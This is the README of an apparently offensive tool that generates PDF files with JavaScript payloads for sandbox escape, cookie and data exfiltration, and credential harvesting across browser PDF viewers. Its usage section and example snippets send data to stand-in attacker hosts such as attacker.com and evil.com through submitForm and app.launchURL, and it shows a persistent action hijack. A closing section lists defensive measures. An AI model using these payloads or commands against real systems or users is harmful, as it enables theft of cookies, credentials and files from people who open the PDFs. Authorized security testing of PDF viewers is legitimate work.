# PDF-XSS Tool v2.0 - Advanced PDF Sandbox Escape Payloads

## 🚀 PDF Browser Exploitation Framework

A research-grade tool for generating PDF files with sophisticated payloads designed to escape PDF sandbox restrictions and achieve DOM access, file system access, and command execution across different browser PDF renderers.

## 📁 Project Structure

```
PDF-XSS/
├── script.py                     # Main PDF generator script
├── Another-Script.py             # Alternative browser-specific PDF generator  
├── pdf_payloads.json            # Consolidated PDF payload database
├── IMPROVEMENTS.md              # Feature improvements documentation
├── merge_json_payloads.py       # JSON payload database merger utility
├── requirements.txt             # Python dependencies
└── README.md                    # This file
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 PDF Browser Targeting

### Browser-Specific PDF Libraries
- **Chrome (PDFium)**: 200+ targeted exploits for V8 engine exploitation, IPC abuse, process injection
- **Firefox (PDF.js)**: 200+ CSP bypass techniques, SpiderMonkey exploitation, Content Security Policy evasion
- **Safari (PDFKit)**: 200+ macOS-specific exploits, WebKit messageHandlers, Objective-C bridge abuse
- **Adobe Reader**: 250+ full JavaScript API exploitation, privilege escalation, file system access
- **Edge PDF**: 150+ Windows integration exploits, WebView exploitation, registry manipulation

### PDF Sandbox Escape Categories
- **DOM Access**: Browser DOM manipulation from PDF context
- **File System**: Local file system access and directory traversal
- **Command Execution**: System command execution and process spawning
- **Sandbox Escape**: PDF sandbox restriction bypasses
- **Network Exfiltration**: Data exfiltration and covert channels

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No additional dependencies for basic functionality

### Installation
```bash
# Clone and navigate to PDF-XSS tool
cd PDF-XSS

# Generate basic PDF files
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all
```

## 📖 Usage

### Basic Commands

```bash
# Show help and available options
python3 script.py --help

# List all available XSS payload types
python3 script.py --list-types

# Generate basic PDF files
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all

# Generate HTML XSS test file
python3 script.py -o html
```

### Advanced PDF Sandbox Escape Usage

```bash
# PDF data exfiltration via form submission escape
python3 script.py -t cookie -u http://attacker.com/collect

# PDF action-based sandbox escape
python3 script.py -t action -u http://collaborator.burpsuite.com

# PDF dialog manipulation for credential harvesting
python3 script.py -t dialog -u http://logger.example.com

# PDF file system escape attempts
python3 script.py -t file

# Generate all PDF sandbox escape types
python3 script.py -t all -u http://collaborator.burpsuite.com

# PDF network escape via URL launching
python3 script.py -t network -u https://webhook.site/unique-id
```

### Browser-Specific PDF Generation

```bash
# Generate Chrome-specific payloads
python3 script.py -b chrome -u http://attacker.com/collect

# Generate all browser payloads with data exfiltration
python3 script.py -b all -u https://webhook.site/xyz

# Target specific payload category
python3 script.py -b firefox --category file_system -u http://evil.com

# Create single file with ALL payloads for Chrome browser
python3 script.py -b chrome --browser-specific-file -u http://test.com

# Create single file with ALL Firefox payloads
python3 script.py -b firefox --browser-specific-file

# Use the alternative script for browser-specific PDFs
python3 Another-Script.py -b chrome -u http://test.com

# Alternative script: Create single file with all Chrome payloads
python3 Another-Script.py -b chrome --browser-specific-file -u http://test.com
```

## 🏁 Command Line Flags

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | `python3 script.py --help` |
| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
| `-b` | `--browser` | Target browser (chrome/firefox/safari/edge/adobe/all) | `-b chrome` |
| | `--browser-specific-file` | Create single file with ALL payloads for specified browser | `--browser-specific-file` |
| | `--list-types` | List available payload types | `--list-types` |

## 📁 Output Files

**All generated PDF files are automatically stored in a `Files/` directory.**

The tool creates the `Files` directory automatically if it doesn't exist. Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`

Examples:
- `Files/xss_alert_20240115_143022.pdf`
- `Files/xss_cookie_20240115_143025.pdf`
- `Files/xss_custom_20240115_143030.pdf`

## 🎯 PDF Sandbox Escape Examples

### PDF Form Submission Escape
```javascript
// PDF-specific data exfiltration
this.submitForm({
    cURL: "http://attacker.com/collect",
    cSubmitAs: "HTML",
    cCharset: "utf-8"
});
```

### PDF URL Launching Escape
```javascript
// Escape sandbox via URL launching
app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
```

### PDF Action Hijacking
```javascript
// Hijack document actions for persistent escape
this.setAction("WillSave", 
    "app.launchURL('http://attacker.com/save-intercept', true);"
);
```

## 🔍 PDF Security Testing Methodology

1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
2. **Upload/Embed Testing**: Test file upload functionality on target applications
3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests

## 📈 Changelog

### Version 2.0 (Current) - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **20+ sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential
- **Action-based persistence**: PDF action hijacking for persistent attacks
- **Dialog exploitation**: Credential harvesting via PDF dialogs
- **Form submission escapes**: Data exfiltration via PDF form submission
- **URL launching escapes**: Sandbox escape via app.launchURL()

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.